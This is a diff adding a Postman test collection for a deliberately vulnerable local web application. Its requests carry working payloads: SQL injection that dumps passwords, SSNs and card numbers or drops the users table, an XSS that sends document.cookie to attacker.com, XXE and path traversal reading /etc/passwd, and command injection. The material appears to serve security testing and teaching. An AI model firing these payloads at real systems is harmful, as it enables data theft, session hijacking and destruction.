@@ -1,0 +1,375 @@
+{
+  "info": {
+    "name": "Vulnerable Web Application - Security Tests",
+    "description": "Collection de tests pour l'application vulnérable",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "baseUrl",
+      "value": "http://localhost:8080/vulnerable-app",
+      "type": "string"
+    }
+  ],
+  "item": [
+    {
+      "name": "Authentication",
+      "item": [
+        {
+          "name": "Login - Admin",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/auth/login?username=admin&password=admin123",
+              "host": ["{{baseUrl}}"],
+              "path": ["auth", "login"],
+              "query": [
+                {"key": "username", "value": "admin"},
+                {"key": "password", "value": "admin123"}
+              ]
+            }
+          }
+        },
+        {
+          "name": "Login - SQL Injection",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/auth/login?username=admin'--&password=anything",
+              "host": ["{{baseUrl}}"],
+              "path": ["auth", "login"],
+              "query": [
+                {"key": "username", "value": "admin'--"},
+                {"key": "password", "value": "anything"}
+              ]
+            }
+          }
+        },
+        {
+          "name": "Register User",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/auth/register?username=testuser&password=test123&email=test@example.com",
+              "host": ["{{baseUrl}}"],
+              "path": ["auth", "register"],
+              "query": [
+                {"key": "username", "value": "testuser"},
+                {"key": "password", "value": "test123"},
+                {"key": "email", "value": "test@example.com"}
+              ]
+            }
+          }
+        },
+        {
+          "name": "Reset Password - No Verification",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/auth/reset-password?username=admin&newPassword=hacked",
+              "host": ["{{baseUrl}}"],
+              "path": ["auth", "reset-password"],
+              "query": [
+                {"key": "username", "value": "admin"},
+                {"key": "newPassword", "value": "hacked"}
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "SQL Injection",
+      "item": [
+        {
+          "name": "Search User - SQL Injection",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/user/search?username=' OR '1'='1",
+              "host": ["{{baseUrl}}"],
+              "path": ["user", "search"],
+              "query": [
+                {"key": "username", "value": "' OR '1'='1"}
+              ]
+            }
+          }
+        },
+        {
+          "name": "List Users - ORDER BY Injection",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/user/list?sortBy=id; DROP TABLE users--",
+              "host": ["{{baseUrl}}"],
+              "path": ["user", "list"],
+              "query": [
+                {"key": "sortBy", "value": "id; DROP TABLE users--"}
+              ]
+            }
+          }
+        },
+        {
+          "name": "Search User - Union Based",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/user/search?username=' UNION SELECT id,username,password,email,role,ssn,credit_card FROM users--",
+              "host": ["{{baseUrl}}"],
+              "path": ["user", "search"],
+              "query": [
+                {"key": "username", "value": "' UNION SELECT id,username,password,email,role,ssn,credit_card FROM users--"}
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "XSS",
+      "item": [
+        {
+          "name": "Comment - Reflected XSS",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/user/comment?username=test&comment=<script>alert('XSS')</script>",
+              "host": ["{{baseUrl}}"],
+              "path": ["user", "comment"],
+              "query": [
+                {"key": "username", "value": "test"},
+                {"key": "comment", "value": "<script>alert('XSS')</script>"}
+              ]
+            }
+          }
+        },
+        {
+          "name": "Comment - Cookie Stealing",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/user/comment?username=attacker&comment=<img src=x onerror=\"fetch('http://attacker.com/steal?c='+document.cookie)\">",
+              "host": ["{{baseUrl}}"],
+              "path": ["user", "comment"],
+              "query": [
+                {"key": "username", "value": "attacker"},
+                {"key": "comment", "value": "<img src=x onerror=\"fetch('http://attacker.com/steal?c='+document.cookie)\">"}
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "XXE",
+      "item": [
+        {
+          "name": "Parse XML - File Disclosure",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/xml"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/xml/parse",
+              "host": ["{{baseUrl}}"],
+              "path": ["xml", "parse"]
+            }
+          }
+        },
+        {
+          "name": "Parse XML - Normal",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/xml"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "<?xml version=\"1.0\"?>\n<root>\n  <data>test</data>\n</root>"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/xml/parse",
+              "host": ["{{baseUrl}}"],
+              "path": ["xml", "parse"]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Broken Access Control",
+      "item": [
+        {
+          "name": "View Profile - User 1",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/user/profile/1",
+              "host": ["{{baseUrl}}"],
+              "path": ["user", "profile", "1"]
+            }
+          }
+        },
+        {
+          "name": "View Profile - User 2 (IDOR)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/user/profile/2",
+              "host": ["{{baseUrl}}"],
+              "path": ["user", "profile", "2"]
+            }
+          }
+        },
+        {
+          "name": "Export All Users (Admin Only)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/user/admin/export",
+              "host": ["{{baseUrl}}"],
+              "path": ["user", "admin", "export"]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Path Traversal",
+      "item": [
+        {
+          "name": "Download File - Normal",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/file/download?filename=test.txt",
+              "host": ["{{baseUrl}}"],
+              "path": ["file", "download"],
+              "query": [
+                {"key": "filename", "value": "test.txt"}
+              ]
+            }
+          }
+        },
+        {
+          "name": "Download File - Path Traversal",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/file/download?filename=../../../../etc/passwd",
+              "host": ["{{baseUrl}}"],
+              "path": ["file", "download"],
+              "query": [
+                {"key": "filename", "value": "../../../../etc/passwd"}
+              ]
+            }
+          }
+        },
+        {
+          "name": "Read File - Arbitrary",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/file/read?path=/etc/passwd",
+              "host": ["{{baseUrl}}"],
+              "path": ["file", "read"],
+              "query": [
+                {"key": "path", "value": "/etc/passwd"}
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Command Injection",
+      "item": [
+        {
+          "name": "Convert File - Normal",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/file/convert?filename=test.jpg",
+              "host": ["{{baseUrl}}"],
+              "path": ["file", "convert"],
+              "query": [
+                {"key": "filename", "value": "test.jpg"}
+              ]
+            }
+          }
+        },
+        {
+          "name": "Convert File - Command Injection",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/file/convert?filename=test.jpg; whoami",
+              "host": ["{{baseUrl}}"],
+              "path": ["file", "convert"],
+              "query": [
+                {"key": "filename", "value": "test.jpg; whoami"}
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Deserialization",
+      "item": [
+        {
+          "name": "Serialize Example",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/deserialize/serialize-example?message=Hello",
+              "host": ["{{baseUrl}}"],
+              "path": ["deserialize", "serialize-example"],
+              "query": [
+                {"key": "message", "value": "Hello"}
+              ]
+            }
+          }
+        },
+        {
+          "name": "Deserialize Object",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/deserialize/object?data=BASE64_ENCODED_SERIALIZED_OBJECT",
+              "host": ["{{baseUrl}}"],
+              "path": ["deserialize", "object"],
+              "query": [
+                {"key": "data", "value": "BASE64_ENCODED_SERIALIZED_OBJECT"}
+              ]
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
